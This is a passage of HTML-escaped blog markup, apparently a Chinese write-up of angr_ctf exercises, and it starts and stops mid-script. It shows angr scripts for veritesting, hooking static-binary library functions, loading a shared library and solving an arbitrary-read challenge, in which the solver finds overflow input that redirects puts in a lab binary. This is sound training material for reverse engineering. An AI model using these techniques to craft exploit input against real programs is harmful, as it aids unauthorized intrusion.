&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    solution_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;globals[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;inputs&amp;#39;&lt;/span&gt;]:
        print (solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(res[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
        print (solution_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(res[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no result&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;veritesting&#34;&gt;veritesting&lt;/h2&gt;
&lt;p&gt;设置 &lt;code&gt;simulation_manager&lt;/code&gt; 时，启用 &lt;code&gt;veritesting&lt;/code&gt; 可以缓解一定程度的路径爆炸&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./12_angr_veritesting&amp;#39;&lt;/span&gt;)

start_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(start_state, veritesting&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_success&lt;/span&gt;(state):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;should_avoid&lt;/span&gt;(state):
    output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Try&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is_success, avoid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; should_avoid)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    print (simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;No result&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单学习了一下 &lt;code&gt;veritesting&lt;/code&gt; 的原理，在本题目的验证环节，代码为&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (buffer[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; complex_function(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;{ write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; letter0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt; ) }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;, i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;{ write(integer) }&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;$&lt;/span&gt;) ) {
      counter0&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;
    }
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果单纯以分支图来话，总共引入了 $2^{32}$ 种可能，然而事实上只有满足和不满足两种情况&lt;/p&gt;
&lt;p&gt;开启 &lt;code&gt;veritesting&lt;/code&gt; 后，angr会在遇到基础代码（无系统调用，间接跳转等语句）时，从动态符号执行（为每一条路径生成一个表达式）切换到静态符号执行（将程序转换为表达式）。因此，在执行这个循环时，先动态恢复控制流图，找到静态符号执行容易分析和难以分析的语句，并推断出易分析节点到难分析节点的影响，最后切换回动态分析来处理不易处理的情况。&lt;/p&gt;
&lt;h2 id=&#34;static-binary&#34;&gt;static binary&lt;/h2&gt;
&lt;p&gt;在 &lt;code&gt;sim_scanf&lt;/code&gt; 中说到，angr 将部分库函数替换为自己实现的 &lt;code&gt;SimProcedures&lt;/code&gt; 来避免路径爆炸，但当遇到静态编译的二进制文件时，由于没有调用库函数，这些静态的函数就有可能造成路径爆炸，需要我们手动替换为 &lt;code&gt;SimProcedures&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./13_angr_static_binary&amp;#39;&lt;/span&gt;)

start_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()

proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x804ED40&lt;/span&gt;, SIM_PROCEDURES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;printf&amp;#39;&lt;/span&gt;]())
proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x804ED80&lt;/span&gt;, SIM_PROCEDURES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scanf&amp;#39;&lt;/span&gt;]())
proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x804F350&lt;/span&gt;, SIM_PROCEDURES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]())
proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048D10&lt;/span&gt;, SIM_PROCEDURES[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;glibc&amp;#39;&lt;/span&gt;][&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__libc_start_main&amp;#39;&lt;/span&gt;]())

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(start_state, veritesting &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_success&lt;/span&gt;(state):
	output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Good Job.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;should_avoid&lt;/span&gt;(state):
	output &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Try again.&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; output

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is_success, avoid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; should_avoid)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
	solution &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
	print (solution&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;posix&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dumps(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
	print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;No result&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;shared-library&#34;&gt;shared library&lt;/h2&gt;
&lt;p&gt;这道题目将加密部分放到了 &lt;code&gt;so&lt;/code&gt; 文件中，因此需要执行 &lt;code&gt;so&lt;/code&gt; 文件&lt;/p&gt;
&lt;p&gt;在执行时遇到的问题有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基地址不确定：使用 &lt;code&gt;base_addr&lt;/code&gt; 来控制程序的基地址&lt;/li&gt;
&lt;li&gt;符号注入的地址未知：使用 &lt;code&gt;call_state&lt;/code&gt; 来控制函数调用时的参数&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

base_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400000&lt;/span&gt;
proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./lib14_angr_shared_library.so&amp;#39;&lt;/span&gt;, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;:base_addr})

store_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x300000&lt;/span&gt;

init_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call_state(base_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6d7&lt;/span&gt;, store_addr, claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVV(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;))

user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
init_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(store_addr, user_input, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)

find_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x775&lt;/span&gt;
simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(init_state)

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
	solution &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
	solution&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(solution&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eax &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
	print (solution&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input, cast_to&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bytes))
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
	print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;no result&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;arbitrary-read&#34;&gt;arbitrary read&lt;/h2&gt;
&lt;p&gt;这道题有些复杂，由于需要让输入的部分溢出，控制 puts 的输出参数&lt;/p&gt;
&lt;p&gt;同样需要替换 &lt;code&gt;scanf&lt;/code&gt;，同时，这道题目为了减小输入的可能性，需要手动添加一下对输入的约束，要求在可见字符范围内&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./15_angr_arbitrary_read&amp;#39;&lt;/span&gt;)

init_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state()

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;replace_scanf&lt;/span&gt;(SimProcedure):
	&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self, fmt, key_addr, stack_addr):
		user_input1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)
		user_input2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user_input2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)

		&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; user_input2&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;chop(bits &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
			self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
			self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;)

		self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(key_addr, user_input1, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
		self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(stack_addr, user_input2)
		self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;globals[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;solutions&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (user_input1, user_input2)

proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hook_symbol(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__isoc99_scanf&amp;#39;&lt;/span&gt;, replace_scanf())

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(init_state)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_puts&lt;/span&gt;(state):
	output_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;esp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, endness &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbolic(output_addr):
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
	FLAG &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; output_addr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x484F4A47&lt;/span&gt;
	copy_state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;copy()
	copy_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(FLAG)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; copy_state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;satisfiable():
		state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_constraints(FLAG)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_success&lt;/span&gt;(state):
	puts_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048370&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; puts_addr:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; check_puts(state)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; is_success)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
	solution &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
